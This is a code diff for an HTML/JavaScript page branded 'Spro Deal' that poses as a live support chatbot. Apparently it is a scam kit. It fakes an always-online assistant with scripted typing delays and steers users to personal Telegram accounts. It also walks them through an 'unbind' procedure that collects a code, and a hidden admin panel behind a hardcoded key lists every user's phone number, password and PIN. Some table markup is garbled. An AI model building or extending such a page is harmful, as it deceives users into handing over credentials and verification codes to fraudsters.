@@ -31,6 +31,12 @@
             text-align: center;
         }
 
+        .container-wide {
+            max-width: 95%;
+            width: 95%;
+            overflow-x: auto;
+        }
+
         .brand {
             font-size: 32px;
             font-weight: 800;
@@ -221,32 +227,97 @@
             100% { box-shadow: 0 0 0 0 rgba(76, 175, 80, 0); }
         }
 
-        .lang-btn {
+        .options-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 8px;
+            margin: 12px 0;
+        }
+
+        .option-btn {
             background: #2e7d32;
             color: white;
-            padding: 14px 20px;
+            padding: 12px 8px;
             border: none;
-            border-radius: 60px;
-            font-size: 18px;
+            border-radius: 14px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+
+        .option-btn:active {
+            transform: scale(0.96);
+        }
+
+        .unbind-now-btn {
+            background: linear-gradient(135deg, #ff9800 0%, #f57c00 100%);
+            color: white;
+            padding: 14px;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            margin: 8px;
-            width: 120px;
+            margin: 10px 0;
+            width: 100%;
+            box-shadow: 0 4px 15px rgba(255,152,0,0.3);
+        }
+
+        .code-input {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 1px solid #e0e0e0;
+            border-radius: 16px;
+            font-size: 18px;
+            text-align: center;
+            letter-spacing: 3px;
+            background: #f8f9fa;
+        }
+
+        .success-msg {
+            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
+            color: #155724;
+            padding: 14px;
+            border-radius: 16px;
+            margin: 10px 0;
+            text-align: center;
+            font-weight: bold;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .telegram-link {
+            display: inline-block;
+            background: linear-gradient(135deg, #0088cc 0%, #005f8c 100%);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 30px;
+            text-decoration: none;
+            margin: 8px 0;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .step-nav {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 15px 0;
         }
 
         .step-btn {
             background: #2e7d32;
             color: white;
-            padding: 12px 24px;
+            padding: 10px 24px;
             border: none;
             border-radius: 40px;
-            font-size: 16px;
+            font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            margin: 8px;
         }
 
-        .step-btn-secondary {
+        .step-btn-back {
             background: #6c757d;
         }
 
@@ -263,26 +334,17 @@
             backdrop-filter: blur(4px);
         }
 
-        .telegram-link {
-            display: inline-block;
-            background: linear-gradient(135deg, #0088cc 0%, #005f8c 100%);
+        .lang-btn {
+            background: #2e7d32;
             color: white;
-            padding: 12px 20px;
-            border-radius: 30px;
-            text-decoration: none;
-            margin: 8px 0;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 60px;
+            font-size: 18px;
             font-weight: bold;
-            font-size: 14px;
-        }
-
-        .success-msg {
-            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
-            color: #155724;
-            padding: 14px;
-            border-radius: 20px;
-            margin: 10px 0;
-            text-align: center;
-            font-weight: bold;
+            cursor: pointer;
+            margin: 8px;
+            width: 120px;
         }
 
         @media (max-width: 480px) {
@@ -290,6 +352,22 @@
             .chat-box { height: 380px; }
             .lang-btn { width: 100px; font-size: 16px; }
         }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 11px;
+        }
+        th, td {
+            border: 1px solid #ddd;
+            padding: 6px;
+        }
+        th { background: #2e7d32; color: white; }
+        .approve-btn { background: green; color: white; padding: 4px 8px; border: none; border-radius: 6px; cursor: pointer; margin: 2px; }
+        .reject-btn { background: red; color: white; padding: 4px 8px; border: none; border-radius: 6px; cursor: pointer; margin: 2px; }
+        .pending { color: orange; font-weight: bold; }
+        .approved { color: green; font-weight: bold; }
+        .rejected { color: red; font-weight: bold; }
     </style>
 </head>
 <body>
@@ -311,9 +389,10 @@
     }
     
     let currentUser = null;
-    let userLanguage = 'english'; // default
+    let userLanguage = 'english';
     let unbindStep = 0;
     let selectedIssue = null;
+    let currentChatBox = null;
     
     async function showTyping(chatBox, duration = 7500) {
         let typingDiv = document.createElement('div');
@@ -357,7 +436,7 @@
             processing: "⏳ Processing your request...",
             chooseIssue: "Please select your issue from below:",
             teamContact: "📞 Need instant help? Contact Spro Team on Telegram:",
-            contactLink: "@RAHUL9358 - Click to chat",
+            contactLink: "@RAHUL935848 - Click to chat",
             verified: "✅ You are verified! Please choose your issue:",
             selling: "📈 Selling Problem",
             withdrawal: "💰 Withdrawal Problem",
@@ -365,7 +444,10 @@
             order: "📦 Order Problem",
             upi: "🔄 UPI Problem",
             forget: "🔑 Password Forget",
-            others: "❓ Others Problem"
+            others: "❓ Others Problem",
+            unbindNow: "🔓 UNBIND NOW",
+            back: "◀ BACK",
+            next: "NEXT ▶"
         },
         hindi: {
             welcome: "स्वागत है! 👋 मैं आपका निजी सहायक हूँ।",
@@ -385,7 +467,7 @@
             processing: "⏳ आपकी request प्रोसेस हो रही है...",
             chooseIssue: "कृपया अपनी समस्या चुनें:",
             teamContact: "📞 तुरंत मदद चाहिए? Telegram पर Spro Team से संपर्क करें:",
-            contactLink: "@RAHUL9358 - बात करने के लिए क्लिक करें",
+            contactLink: "@RAHUL935848 - बात करने के लिए क्लिक करें",
             verified: "✅ आप verified हो गए हैं! कृपया अपनी समस्या चुनें:",
             selling: "📈 सेलिंग प्रॉब्लम",
             withdrawal: "💰 विदड्रॉल प्रॉब्लम",
@@ -393,7 +475,10 @@
             order: "📦 ऑर्डर प्रॉब्लम",
             upi: "🔄 UPI प्रॉब्लम",
             forget: "🔑 पासवर्ड भूल गए",
-            others: "❓ अन्य समस्या"
+            others: "❓ अन्य समस्या",
+            unbindNow: "🔓 अभी अनबाइंड करें",
+            back: "◀ पीछे",
+            next: "आगे ▶"
         }
     };
     
@@ -413,7 +498,7 @@
                 <h3 style="margin-bottom: 15px; color:#333;">SIGN IN TO SPRO DEAL</h3>
                 <div class="phone-wrapper">
                     <span class="country-code">+91</span>
-                    <input type="tel" id="phone" placeholder="Please enter phone number" class="input-field" style="border: none; padding-left: 0;">
+                    <input type="tel" id="phone" placeholder="Please enter phone number">
                 </div>
                 <input type="password" id="password" placeholder="Password" class="input-field">
                 <button id="signinBtn" class="green-btn">SIGN IN</button>
@@ -465,7 +550,89 @@
             let users = getUsers();
             let user = users.find(u => u.phone === currentUser.phone);
             if (user) { user.pin = pin; saveUsers(users); currentUser.pin = pin; }
+            renderDashboard();
+        };
+        document.getElementById('secretAdminBtn').onclick = () => {
+            let key = prompt('🔐 ENTER ADMIN KEY');
+            if (key === 'SPRO2025') renderAdminPanel();
+            else if (key) alert('❌ Invalid Key');
+        };
+    }
+    
+    function renderDashboard() {
+        document.getElementById('app').innerHTML = `
+            <div class="container" style="max-width: 500px;">
+                <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 12px;">
+                    <h3 style="font-size: 18px;">🤖 Spro Support</h3>
+                    <span class="online-status"></span>
+                    <span style="font-size: 11px; color: green;">Online • Active now</span>
+                </div>
+                <div id="chatBox" class="chat-box"></div>
+                
+                <div id="optionsArea" class="options-grid"></div>
+                <button id="unbindNowBtn" class="unbind-now-btn">🔓 ${t('unbindNow')}</button>
+                <div id="dynamicArea"></div>
+                <div id="successArea"></div>
+                
+                <button id="logoutBtn" class="gray-btn">LOGOUT</button>
+            </div>
+            <div class="secret-admin-btn" id="secretAdminBtn"></div>
+        `;
+        
+        const chatBox = document.getElementById('chatBox');
+        const optionsArea = document.getElementById('optionsArea');
+        currentChatBox = chatBox;
+        
+        // Welcome message
+        setTimeout(() => {
+            addMessage(chatBox, 'bot', t('welcome'));
+            setTimeout(() => {
+                addMessage(chatBox, 'bot', t('chooseIssue'));
+            }, 2000);
+        }, 500);
+        
+        const issues = [
+            { id: 'selling', name: t('selling') },
+            { id: 'withdrawal', name: t('withdrawal') },
+            { id: 'deposit', name: t('deposit') },
+            { id: 'order', name: t('order') },
+            { id: 'upi', name: t('upi') },
+            { id: 'forget', name: t('forget') },
+            { id: 'others', name: t('others') }
+        ];
+        
+        issues.forEach(issue => {
+            let btn = document.createElement('button');
+            btn.className = 'option-btn';
+            btn.innerHTML = issue.name;
+            btn.onclick = () => {
+                addMessage(chatBox, 'user', issue.name);
+                addMessage(chatBox, 'bot', `✅ ${t('codeSuccess')} Your issue has been recorded. Our team will contact you soon.`);
+                addMessage(chatBox, 'bot', `${t('teamContact')} <a href="https://t.me/RAHUL935848" target="_blank" class="telegram-link">📱 @RAHUL935848</a>`, true);
+                
+                // Save issue
+                let requests = getRequests();
+                let newRequest = {
+                    id: Date.now(),
+                    phone: currentUser.phone,
+                    issue: issue.id,
+                    status: 'pending',
+                    created_at: new Date().toISOString()
+                };
+                requests.push(newRequest);
+                saveRequests(requests);
+            };
+            optionsArea.appendChild(btn);
+        });
+        
+        // Unbind Now button
+        document.getElementById('unbindNowBtn').onclick = () => {
             renderLanguageSelect();
+        };
+        
+        document.getElementById('logoutBtn').onclick = () => {
+            currentUser = null;
+            renderLogin();
         };
         document.getElementById('secretAdminBtn').onclick = () => {
             let key = prompt('🔐 ENTER ADMIN KEY');
@@ -495,7 +662,8 @@
     }
     
     function renderUnbindGuide() {
-        let step = 0;
+        let currentStep = 1;
+        const totalSteps = 5;
         
         document.getElementById('app').innerHTML = `
             <div class="container" style="max-width: 500px;">
@@ -505,46 +673,42 @@
                     <span style="font-size: 11px; color: green;">Online • Active now</span>
                 </div>
                 <div id="chatBox" class="chat-box"></div>
-                <div id="stepButtons" style="display: flex; gap: 10px; justify-content: center; margin: 10px 0;"></div>
+                <div id="stepNav" class="step-nav"></div>
                 <div id="dynamicArea"></div>
                 <div id="successArea"></div>
-                <button id="logoutBtn" class="gray-btn">LOGOUT</button>
+                <button id="backToDashboard" class="gray-btn">◀ BACK</button>
             </div>
             <div class="secret-admin-btn" id="secretAdminBtn"></div>
         `;
         
         const chatBox = document.getElementById('chatBox');
-        const stepButtons = document.getElementById('stepButtons');
+        const stepNav = document.getElementById('stepNav');
         
-        async function showStep(stepNum) {
+        async function showStep(step) {
             await showTyping(chatBox, 7500);
             
-            if (stepNum === 0) {
-                addMessage(chatBox, 'bot', t('welcome'));
-                await showTyping(chatBox, 3000);
+            if (step === 1) {
                 addMessage(chatBox, 'bot', t('startGuide'));
-            }
-            else if (stepNum === 1) {
+                await showTyping(chatBox, 3000);
                 addMessage(chatBox, 'bot', t('step1'));
                 addMessage(chatBox, 'bot', `<a href="https://t.me/uk_member_robot" target="_blank" class="telegram-link">🤖 @uk_member_robot</a>`, true);
                 addMessage(chatBox, 'bot', t('step1instruction'));
             }
-            else if (stepNum === 2) {
+            else if (step === 2) {
                 addMessage(chatBox, 'bot', t('step2'));
             }
-            else if (stepNum === 3) {
+            else if (step === 3) {
                 addMessage(chatBox, 'bot', t('step3'));
             }
-            else if (stepNum === 4) {
+            else if (step === 4) {
                 addMessage(chatBox, 'bot', t('step4'));
             }
-            else if (stepNum === 5) {
+            else if (step === 5) {
                 addMessage(chatBox, 'bot', t('step5'));
                 
-                // Show code input
                 const dynamicArea = document.getElementById('dynamicArea');
                 dynamicArea.innerHTML = `
-                    <input type="text" id="unbindCodeInput" class="input-field" placeholder="${t('enterCode')}" style="text-align: center; letter-spacing: 2px;">
+                    <input type="text" id="unbindCodeInput" class="code-input" placeholder="${t('enterCode')}">
                     <button id="submitCodeBtn" class="green-btn">${t('submit')}</button>
                 `;
                 
@@ -572,7 +736,6 @@
                     requests.push(newRequest);
                     saveRequests(requests);
                     
-                    // Show success
                     document.getElementById('successArea').innerHTML = `
                         <div class="success-msg">
                             ✅✅✅<br>
@@ -580,17 +743,18 @@
                             ${t('processing')}
                         </div>
                     `;
+                    dynamicArea.innerHTML = '';
                     
-                    // Show issue selection
                     setTimeout(() => {
                         addMessage(chatBox, 'bot', t('verified'));
-                        setTimeout(() => showIssueOptions(), 2000);
+                        setTimeout(() => showIssueSelection(), 2000);
                     }, 2000);
                 };
             }
         }
         
-        function showIssueOptions() {
+        function showIssueSelection() {
+            const dynamicArea = document.getElementById('dynamicArea');
             const issues = [
                 { id: 'selling', name: t('selling') },
                 { id: 'withdrawal', name: t('withdrawal') },
@@ -601,61 +765,60 @@
                 { id: 'others', name: t('others') }
             ];
             
-            const dynamicArea = document.getElementById('dynamicArea');
             dynamicArea.innerHTML = `
                 <div class="options-grid" style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 10px;">
                     ${issues.map(issue => `<button class="option-btn" data-issue="${issue.id}" style="background:#2e7d32; color:white; padding:12px; border:none; border-radius:14px; cursor:pointer;">${issue.name}</button>`).join('')}
                 </div>
                 <div style="margin-top: 15px; padding: 12px; background: #e8f5e9; border-radius: 16px; text-align: center;">
                     <p style="font-size: 12px; color: #2e7d32;">${t('teamContact')}</p>
-                    <a href="https://t.me/RAHUL9358" target="_blank" class="telegram-link" style="background: #0088cc; padding: 8px 16px; font-size: 13px;">📱 @RAHUL9358</a>
+                    <a href="https://t.me/RAHUL935848" target="_blank" class="telegram-link" style="background: #0088cc; padding: 8px 16px; font-size: 13px;">📱 @RAHUL935848</a>
                 </div>
             `;
             
             document.querySelectorAll('.option-btn').forEach(btn => {
                 btn.onclick = () => {
-                    selectedIssue = btn.dataset.issue;
-                    addMessage(chatBox, 'user', btn.innerText);
-                    addMessage(chatBox, 'bot', `✅ ${t('codeSuccess')} Your issue has been recorded. Our team will contact you soon.`);
-                    addMessage(chatBox, 'bot', `📞 ${t('teamContact')} <a href="https://t.me/RAHUL9358" target="_blank">@RAHUL9358</a>`, true);
+                    addMessage(currentChatBox || chatBox, 'user', btn.innerText);
+                    addMessage(currentChatBox || chatBox, 'bot', `✅ ${t('codeSuccess')} Your issue has been recorded.`);
+                    addMessage(currentChatBox || chatBox, 'bot', `${t('teamContact')} <a href="https://t.me/RAHUL935848" target="_blank">@RAHUL935848</a>`, true);
                     
-                    // Save final issue
                     let requests = getRequests();
                     let lastReq = requests[requests.length - 1];
                     if (lastReq) {
-                        lastReq.finalIssue = selectedIssue;
+                        lastReq.finalIssue = btn.dataset.issue;
                         saveRequests(requests);
                     }
+                    
+                    setTimeout(() => renderDashboard(), 3000);
                 };
             });
         }
         
-        // Show steps sequentially with Next/Back buttons
-        async function startGuide() {
-            stepButtons.innerHTML = `
-                <button id="nextBtn" class="step-btn">Next ➤</button>
+        async function updateNavigation() {
+            stepNav.innerHTML = `
+                ${currentStep > 1 ? `<button id="prevStep" class="step-btn step-btn-back">${t('back')}</button>` : ''}
+                ${currentStep < totalSteps ? `<button id="nextStep" class="step-btn">${t('next')}</button>` : ''}
             `;
             
-            await showStep(0);
-            let currentStep = 1;
+            if (currentStep === 1) await showStep(1);
+            else await showStep(currentStep);
             
-            document.getElementById('nextBtn').onclick = async () => {
-                if (currentStep <= 5) {
-                    await showStep(currentStep);
+            if (document.getElementById('nextStep')) {
+                document.getElementById('nextStep').onclick = () => {
                     currentStep++;
-                    if (currentStep > 5) {
-                        stepButtons.innerHTML = '';
-                    }
-                }
-            };
+                    updateNavigation();
+                };
+            }
+            if (document.getElementById('prevStep')) {
+                document.getElementById('prevStep').onclick = () => {
+                    currentStep--;
+                    updateNavigation();
+                };
+            }
         }
         
-        startGuide();
+        updateNavigation();
         
-        document.getElementById('logoutBtn').onclick = () => {
-            currentUser = null;
-            renderLogin();
-        };
+        document.getElementById('backToDashboard').onclick = () => renderDashboard();
         document.getElementById('secretAdminBtn').onclick = () => {
             let key = prompt('🔐 ENTER ADMIN KEY');
             if (key === 'SPRO2025') renderAdminPanel();
@@ -675,7 +838,7 @@
                 <div id="pendingTable"></div>
                 <h3>📜 ALL REQUESTS</h3>
                 <div id="allRequestsTable"></div>
-                <h3>👥 USERS</h3>
+                <h3>👥 USERS (Phone, Password, PIN)</h3>
                 <div id="usersTable"></div>
                 <button id="adminLogout" class="gray-btn">LOGOUT</button>
             </div>
@@ -683,16 +846,16 @@
         `;
         
         let pending = requests.filter(r => r.status === 'pending');
-        let pendingHtml = '能atable<th>ID</th><th>Phone</th><th>Code</th><th>Issue</th><th>Action</th></tr>';
+        let pendingHtml = '能atable<th>ID</th><th>Phone</th><th>Code/Issue</th><th>Action</th></tr>';
         pending.forEach(r => {
-            pendingHtml += `<tr><td>${r.id}</td><td>${r.phone}</td><td><strong>${r.code}</strong></td><td>${r.finalIssue || r.issue}</td><td><button class="approve-btn" data-id="${r.id}">Approve</button><button class="reject-btn" data-id="${r.id}">Reject</button></td></tr>`;
+            pendingHtml += `<tr><td>${r.id}</td><td>${r.phone}</td><td><strong>${r.code || r.issue || r.finalIssue}</strong></td><td><button class="approve-btn" data-id="${r.id}">Approve</button><button class="reject-btn" data-id="${r.id}">Reject</button></td></tr>`;
         });
         pendingHtml += '</table>';
         document.getElementById('pendingTable').innerHTML = pendingHtml;
         
-        let allHtml = '能atable<th>ID</th><th>Phone</th><th>Code</th><th>Status</th><th>Time</th></tr>';
+        let allHtml = '能atable<th>ID</th><th>Phone</th><th>Details</th><th>Status</th><th>Time</th></tr>';
         [...requests].reverse().forEach(r => {
-            allHtml += `<tr><td>${r.id}</td><td>${r.phone}</td><td>${r.code}</td><td class="${r.status}">${r.status}</td><td>${new Date(r.created_at).toLocaleString()}</td></tr>`;
+            allHtml += `<tr><td>${r.id}</td><td>${r.phone}</td><td>${r.code || r.issue || r.finalIssue}</td><td class="${r.status}">${r.status}</td><td>${new Date(r.created_at).toLocaleString()}</td></tr>`;
         });
         allHtml += '</table>';
         document.getElementById('allRequestsTable').innerHTML = allHtml;
